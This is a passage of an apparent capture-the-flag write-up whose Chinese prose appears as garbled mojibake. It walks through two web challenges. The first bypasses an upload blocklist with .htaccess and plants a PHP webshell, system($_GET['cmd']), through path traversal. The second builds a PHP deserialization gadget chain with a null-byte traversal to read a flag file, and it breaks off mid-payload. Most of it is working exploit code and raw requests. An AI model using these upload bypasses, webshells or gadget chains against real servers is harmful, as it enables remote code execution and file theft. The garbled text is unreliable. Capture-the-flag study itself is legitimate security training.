class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;è¯·æ±‚æ–¹å¼é”™è¯¯&#x27;</span>]);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_as_image</span>(<span class="params"><span class="variable">$image_type</span>, <span class="variable">$image_tmp_file</span>, <span class="variable">$upload_base_dir</span>, <span class="variable">$file_ext_black_list</span>, <span class="variable">$image_filename</span>=<span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$image_type</span>, <span class="variable">$file_ext_black_list</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;jpg&#x27;</span>:</span><br><span class="line">                <span class="variable">$image_ext</span> = <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;png&#x27;</span>:</span><br><span class="line">                <span class="variable">$image_ext</span> = <span class="string">&#x27;.png&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;gif&#x27;</span>:</span><br><span class="line">                <span class="variable">$image_ext</span> = <span class="string">&#x27;.gif&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$image_ext</span> = <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$image_size</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$image_tmp_file</span>);</span><br><span class="line">        <span class="variable">$image_width</span> = <span class="variable">$image_size</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$image_height</span> = <span class="variable">$image_size</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$image_width</span> &gt; <span class="number">200</span> || <span class="variable">$image_height</span> &gt; <span class="number">200</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$image_filename</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$image_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="variable">$image_ext</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$image_filename</span> = <span class="variable">$image_filename</span> . <span class="variable">$image_ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_base_dir</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_base_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$image_file_path</span> = <span class="variable">$upload_base_dir</span> . <span class="variable">$image_filename</span>;</span><br><span class="line">        <span class="title function_ invoke__">rename</span>(<span class="variable">$image_tmp_file</span>, <span class="variable">$image_file_path</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_as_text</span>(<span class="params"><span class="variable">$text_type</span>, <span class="variable">$text_tmp_file</span>, <span class="variable">$upload_base_dir</span>, <span class="variable">$text_filename</span>=<span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$text_type</span>, <span class="string">&quot;ph&quot;</span>)  || <span class="title function_ invoke__">in_array</span>(<span class="variable">$text_type</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;shtml&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phtm&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>, <span class="string">&#x27;php8&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;tpl&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;.&quot;</span>) || <span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">strlen</span>(<span class="variable">$text_type</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$text_ext</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//ä»…åŒ…å«å­—æ¯</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$text_type</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$text_ext</span> = <span class="string">&quot;.&quot;</span> . <span class="variable">$text_type</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$text_filename</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$text_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="variable">$text_ext</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$text_filename</span> = <span class="variable">$text_filename</span> . <span class="variable">$text_ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$text_filename</span>) == <span class="number">0</span> || <span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;/&quot;</span>) ||!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9_]/is&#x27;</span>, <span class="variable">$text_filename</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_base_dir</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_base_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$text_file_path</span> = <span class="variable">$upload_base_dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$text_filename</span>;</span><br><span class="line">        <span class="title function_ invoke__">rename</span>(<span class="variable">$text_tmp_file</span>, <span class="variable">$text_file_path</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜ç›®èŠ±é‡Œèƒ¡å“¨ï¼Œå…¶å®æŒºç®€å•çš„ï¼Œä¸»è¦è¿˜æ˜¯è€ƒå¯Ÿç»†å¿ƒï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªä¸Šä¼ å¤„ç†çš„å‡½æ•°ï¼š1ã€upload_as_image  2ã€upload_as_text </p>
<p>å…¶ä¸­upload_as_textçœ‹ä¼¼è¿‡æ»¤ä¸¥æ ¼ï¼Œä½†æ˜¯é»‘åå•ä¸­.htaccessè¿™ä¸ªåŠ äº†ä¸€ä¸ª.å°±å¯¼è‡´è¿™ä¸ªåç¼€æ˜¯å¯ä»¥é¥¶è¿‡çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡upload_as_textä¸Šä¼ .htaccessè¿›è¡Œæ–‡ä»¶ä¸Šä¼ çš„åˆ©ç”¨ã€‚</p>
<p>ä¸Šä¼ æ–‡ä»¶.htaccess</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryEjLloJDH5ErZUmS9</span><br><span class="line">Content-Disposition: form-data; name=&quot;hw_file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">test</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">------WebKitFormBoundaryEjLloJDH5ErZUmS9--</span><br></pre></td></tr></table></figure>

<p>ç›®å½•éœ€è¦éå†æ—¶é—´æˆ³å¾—åˆ°åœ¨<a href="http://eci-2zei6d9vvhdroisf54t1.cloudeci1.ichunqiu.com/uploads/files/20220827113034/.htaccess">&#x2F;uploads&#x2F;files&#x2F;20220827113034&#x2F;.htaccess</a></p>
<p>ä½†æ˜¯æ¯æ¬¡ä¸Šä¼ çš„è¿™ä¸ªæ—¶é—´æˆ³éƒ½ä¸ä¸€æ ·ï¼Œè¿™å°±æ²¡åŠæ³•ä½¿ç”¨.htaccessè¿›è¡Œgetshellï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªå‡½æ•°upload_as_imageï¼š</p>
<p>è¿™ä¸ªå‡½æ•°æ²¡æœ‰ç¦æ­¢è¿›è¡Œç›®å½•ç¿»é˜…ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæŒ‡å®šç›®å½•çš„test.jpg è¿›è¡Œgetshellã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /public/index.php/index/index/upload.html?hw_file_name=../../files/20220827113034/test HTTP/1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryEjLloJDH5ErZUmS9</span><br><span class="line">Content-Disposition: form-data; name=&quot;hw_file&quot;; filename=&quot;test.jpg&quot;</span><br><span class="line">Content-Type: image/plain</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php echo &quot;Shell&quot;;system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></span><br><span class="line">------WebKitFormBoundaryEjLloJDH5ErZUmS9--</span><br></pre></td></tr></table></figure>

<p>è®¿é—®è¿™ä¸ªå›¾ç‰‡é©¬å»æ‹¿flag</p>
<h3 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h3><p>é¦–å…ˆæ‰“å¼€é¢˜ç›®å°±æ˜¯æºç ï¼Œæºç ä¸­æœ‰ä¸€ä¸ªgameå‚æ•°æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥åªéœ€è¦æ‰¾ä¸€ä¸ªåˆ©ç”¨é“¾å°±è¡Œäº†ã€‚</p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abaaba</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$DoNotGet</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span> = <span class="string">&quot;two&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onemore</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;images/def.jpg&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&quot;images/def.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="keyword">isset</span>(<span class="variable">$f</span>) ? <span class="variable">$f</span> : <span class="string">&#x27;image&#x27;</span>.<span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">safe</span>(<span class="variable">$this</span>-&gt;file));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filename-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suhasuha</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Giveme</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Giveme = (<span class="variable language_">$this</span>-&gt;action)();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;count = <span class="string">&quot;one&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;try &quot;</span>.<span class="variable language_">$this</span>-&gt;count.<span class="string">&quot; again&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/.*\/\/.*/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\..\..*/&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;game&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;game&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘æ˜¯ä»ä¸‹å¾€ä¸Šçœ‹çš„é¦–å…ˆå°±çœ‹åˆ°äº†Oneè¿™ä¸ªç±»çš„destructè¿›è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¾ˆæ˜æ˜¾å°±èƒ½æƒ³è±¡åˆ°ä¼šè°ƒç”¨__tostringå‡½æ•°,æ‰€ä»¥æŸ¥æ‰¾tostringå‘ç°ç±»abaabaå­˜åœ¨tostringï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ$this-&gt;count æŒ‡å‘abaabaçš„å¯¹åº”å¯¹è±¡ä¸Šæ—¢å¯ä»¥è¿›å…¥abaabaã€‚</p>
<p>ç„¶åabaabaç±»çš„tostringè°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§(Giveme)ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abaaba</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$DoNotGet</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span> = <span class="string">&quot;two&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;-</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§æ—¶ä¼šè°ƒç”¨__geté­”æœ¯æ–¹æ³•ä»è€Œè¿›è¡Œå¯¹$this-&gt;DoNotGet-&gt;$nameçš„è®¾ç½®ã€‚è€Œè®¾ç½®ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§ä¼šè°ƒç”¨é­”æœ¯æ–¹æ³•setï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å…³æ³¨ä¸‹ ç±»suhasuhaï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suhasuha</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Giveme</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Giveme = (<span class="variable language_">$this</span>-&gt;action)();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>suhasuhaçš„setæ–¹æ³•æ­£å¥½è§¦å‘å±é™©å‡½æ•°å¯ä»¥è°ƒç”¨ä¸€ä¸ªæ— å‚æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæ–¹æ³•è®¾ä¸ºç±»Onemoreçš„readfileï¼Œå°½ç®¡readfileæœ‰å‚æ•°ï¼Œä½†æ˜¯æ— å‚ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„ ä¼šèµ°åˆ°imageæ‹¼æ¥è·¯å¾„é‚£ä¸€æ­¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onemore</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;images/def.jpg&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&quot;images/def.jpg&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="keyword">isset</span>(<span class="variable">$f</span>) ? <span class="variable">$f</span> : <span class="string">&#x27;image&#x27;</span>.<span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">safe</span>(<span class="variable">$this</span>-&gt;file));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filename-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚ä½•åˆ¶å®šactionè°ƒç”¨ç±»çš„æŒ‡å®šæ–¹æ³•å‘¢ï¼Ÿ</p>
<p>ç”¨æ•°ç»„ï¼š$this-&gt;action&#x3D;array(new Onemore(),â€readfileâ€);</p>
<p>ç„¶åæˆ‘ä»¬è®¾å®šOnemoreç±»ä¸­çš„fileå‚æ•°å°±èƒ½è¿›è¡Œä»»æ„ç›®å½•æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯safeä¸­è¿‡æ»¤äº†ä¸€äº›å‚æ•°ï¼Œå¥½åƒæ˜¯ä¸èƒ½é¥¶è¿‡ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡00é¥¶è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Onemore</span>-&gt;file = <span class="string">&quot;..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/..\x00/flag&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çš„æ€è·¯æ•´ç†å®Œäº†ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥ç”Ÿæˆå¯¹è±¡å¹¶æ ¹æ®æ€è·¯è¿›è¡Œèµ‹å€¼æ—¶ä¼šå‘ç°æŠ¥é”™ï¼š</p>
<p>ç±»abaabaçš„DoNotGetå±æ€§æ—¶protectedçš„ï¼Œæ˜¯æ— æ³•å¤–éƒ¨èµ‹å€¼çš„ï¼Œå¯¹äºè¿™ç§ç§æœ‰å’Œä¿æŠ¤çš„å±æ€§è¿›è¡Œå¤„ç†æ—¶ï¼Œå¦‚æœä»–ä¸æ˜¯åºåˆ—åŒ–ä¸­å¿…é¡»çš„å‚æ•°ï¼Œå¯ä»¥ç›´æ¥åˆ é™¤ï¼Œå¦‚æœå¿…é¡»è¦ç”¨åˆ°ä¸”æ˜¯æ— æ³•å¤–éƒ¨è°ƒç”¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨__constructæ„é€ å‡½æ•°è¿›è¡Œå†…éƒ¨èµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ç›´æ¥åœ¨newå¯¹è±¡çš„æ—¶å€™å°±å®Œæˆå±æ€§èµ‹å€¼ã€‚</p>
<p>æœ€ç»ˆçš„payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abaaba</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$DoNotGet</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span> = <span class="string">&quot;two&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;DoNotGet-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="variable">$suhasuha</span> = <span class="keyword">new</span> <span class="title function_ invoke__">suhasuha</span>();</span><br><span class="line">    	<span class="variable">$Onemore</span> = <span class="keyword">new</span> <span class="title class_">Onemore</span>();</span><br><span class="line">    	<span class="variable">$Onemore</span>-&gt;file = <span class="string">&quot;..\x00/..\x00/flag.php&quot;</span>;</span><br><span class="line">    	<span class="variable">$suhasuha</span>-&gt;action = <span class="keyword">array</span>(<span class="variable">$Onemore</span>,<span class="string">&quot;readfile&quot;</span>);</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;DoNotGet = <span class="variable">$suhasuha</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onemore</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="comment"># private ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;images/def.jpg&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&quot;images/def.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="keyword">isset</span>(<span class="variable">$f</span>) ? <span class="variable">$f</span> : <span class="string">&#x27;image&#x27;</span>.<span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">safe</span>(<span class="variable">$this</span>-&gt;file));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filename-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suhasuha</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Giveme</span>;</span><br><span class="line">    